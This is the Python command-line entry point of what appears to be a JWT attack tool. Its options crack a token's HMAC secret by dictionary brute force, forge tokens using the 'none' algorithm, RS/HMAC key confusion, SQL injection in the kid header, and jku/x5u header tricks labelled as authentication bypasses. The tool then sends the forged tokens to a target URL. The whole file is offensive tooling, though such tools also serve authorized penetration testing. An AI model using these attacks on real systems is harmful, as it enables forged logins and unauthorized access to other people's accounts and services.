import json
import sys
from json import JSONDecodeError

import click
import requests

from MyJWT.modifyJWT import changePayload, addheader, changeAlg, signature, addpayload
from MyJWT.utils import jwtToJson, encodeJwt, HEADER, isValidJwt, SIGNATURE
from MyJWT.variables import NOT_VALID_JWT, CHECK_DOCS, NOT_CRAKED, CRACKED, VALID_PAYLOAD, VALID_HEADER, \
    VALID_PAYLOAD_JSON, NEW_JWT, INVALID_SIGNATURE, VALID_SIGNATURE, VALID_DATA, VALID_COOKIES, VERSION
from MyJWT.vulnerabilities import injectSqlKid, bruteforceDict, printDecoded, confusionRsaHmac, sendJwtToUrl, \
    jkuVulnerability, x5uVulnerability


@click.command()
@click.version_option(VERSION)
@click.argument('jwt')
# modify your jwt
@click.option("--full-payload", help="New payload for your jwt.Json format Required.")
@click.option("--add-header", "-h",
              help="Add a new key, value to your jwt header, if key is present old value will be replaced.Format: key=value.",
              multiple=True)
@click.option("--add-payload", "-p",
              help="Add a new key, value to your jwt payload, if key is present old value will be replaced.Format: key=value.",
              multiple=True)
# signature
@click.option("--sign", help="Sign Your jwt with key given.")
@click.option("--verify", help="verify your key.")
# vulnerabilities
@click.option("--none-vulnerability", '-none', is_flag=True, help="Check None Alg vulnerability.")
@click.option("--hmac", type=click.Path(exists=True), help="Check RS/HMAC Alg vulnerability.")
@click.option("--bruteforce", type=click.Path(exists=True),
              help="Bruteforce to guess th secret used to sign the token.")
@click.option("--kid", help="Kid Injection sql")
@click.option("--jku", help="Jku Header to bypass authentication")
@click.option("--x5u", help="X5u Header to bypass authentication")
@click.option("--crt", help="For x5cHeader, force crt file")
@click.option("--key", help="For jku or x5c Header, force private key to your key file")
@click.option("--file", help="For jku Header, force file name")
# print
@click.option("--print", is_flag=True, help="Print Decoded JWT")
# url
@click.option("-u", "--url", help="Url to send your jwt.")
@click.option("-m", "--method", help="Method use for send request to url.(Default GET).", default="GET")
@click.option("-d", "--data",
              help="Data send to your url.Format: key=value. if value = MY_JWT value will be replace by new jwt.",
              multiple=True)
@click.option("-c", "--cookies",
              help="Cookies to send to your url.Format: key=value. if value = MY_JWT value will be replace by new jwt.",
              multiple=True)
def myjwt_cli(jwt, full_payload, add_header, add_payload, sign, verify, none_vulnerability, hmac, bruteforce, kid,
              jku, x5u, crt, key, file, print, url, method, data, cookies):
    if not isValidJwt(jwt):
        sys.exit(NOT_VALID_JWT)
    if bruteforce:
        jwtJson = jwtToJson(jwt)
        if "HS" not in jwtJson[HEADER]["alg"]:
            sys.exit(CHECK_DOCS)
        key = bruteforceDict(jwt, bruteforce)
        if key == "":
            sys.exit(NOT_CRAKED)
        else:
            click.echo(CRACKED + key)
            if not add_header and not add_payload and not full_payload:
                sys.exit()

    if add_payload:
        payloadDict = dict()
        for payload in add_payload:
            newStr = payload.split("=")
            if len(newStr) != 2:
                sys.exit(VALID_PAYLOAD)
            payloadDict[newStr[0]] = newStr[1]
        jwtJson = addpayload(jwtToJson(jwt), payloadDict)
        jwt = encodeJwt(jwtJson) + "." + jwtJson[SIGNATURE]

    if add_header:
        headerDict = dict()
        for header in add_header:
            newStr = header.split("=")
            if len(newStr) != 2:
                sys.exit(VALID_HEADER)
            headerDict[newStr[0]] = newStr[1]
        jwtJson = addheader(jwtToJson(jwt), headerDict)
        jwt = encodeJwt(jwtJson) + "." + jwtJson[SIGNATURE]

    if full_payload:
        click.echo(full_payload)
        try:
            jwtJson = changePayload(jwtToJson(jwt), json.loads(full_payload))
            jwt = encodeJwt(jwtJson) + "." + jwtJson[SIGNATURE]
        except JSONDecodeError:
            sys.exit(VALID_PAYLOAD_JSON)
    if x5u:
        jwt = x5uVulnerability(jwt, url=x5u, pem=key, crt=crt)
        click.echo(NEW_JWT + jwt)
    if jku:
        jwt = jkuVulnerability(jwt, jku, file, key)
        click.echo(NEW_JWT + jwt)
        click.echo(f"Please run python -m http.server --bind {jku} .Before send your jwt")
    if kid:
        jwt = injectSqlKid(jwt, kid)
        if not sign:
            click.echo(NEW_JWT + jwt)
    if hmac:
        jwt = confusionRsaHmac(jwt, hmac)
        click.echo(NEW_JWT + jwt)

    if none_vulnerability:
        jwtJson = changeAlg(jwtToJson(jwt), "none")
        jwt = encodeJwt(jwtJson) + "."
        click.echo(NEW_JWT + jwt)
    if sign:
        jwtJson = jwtToJson(jwt)
        if "HS" not in jwtJson[HEADER]["alg"]:
            sys.exit(CHECK_DOCS)
        jwt = signature(jwtJson, sign)
        click.echo(NEW_JWT + jwt)
    if verify:
        jwtJson = jwtToJson(jwt)
        if "HS" not in jwtJson[HEADER]["alg"]:
            sys.exit(CHECK_DOCS)
        newJwt = signature(jwtJson, verify)
        click.echo(VALID_SIGNATURE if newJwt.split('.')[2] == jwt.split('.')[2] else INVALID_SIGNATURE)
    if url:
        dataDict = dict()
        for d in data:
            newStr = d.split("=")
            if len(newStr) != 2:
                sys.exit(VALID_DATA)
            if newStr[1] == "MY_JWT":
                dataDict[newStr[0]] = jwt
            else:
                dataDict[newStr[0]] = newStr[1]

        cookiesDict = dict()
        for cookie in cookies:
            newStr = cookie.split("=")
            if len(newStr) != 2:
                sys.exit(VALID_COOKIES)
            if newStr[1] == "MY_JWT":
                cookiesDict[newStr[0]] = jwt
            else:
                cookiesDict[newStr[0]] = newStr[1]
        try:
            t = sendJwtToUrl(url, method, dataDict, cookiesDict, jwt)
            click.echo(t.text)
        except requests.exceptions.ConnectionError:
            sys.exit("Connection Error. Verify your url")
    if print:
        printDecoded(jwt)

    if not none_vulnerability and not hmac and not bruteforce and not sign and not verify and not jku and not x5u and not print:
        click.echo(NEW_JWT + jwt)
    sys.exit()


if __name__ == '__main__':
    myjwt_cli()
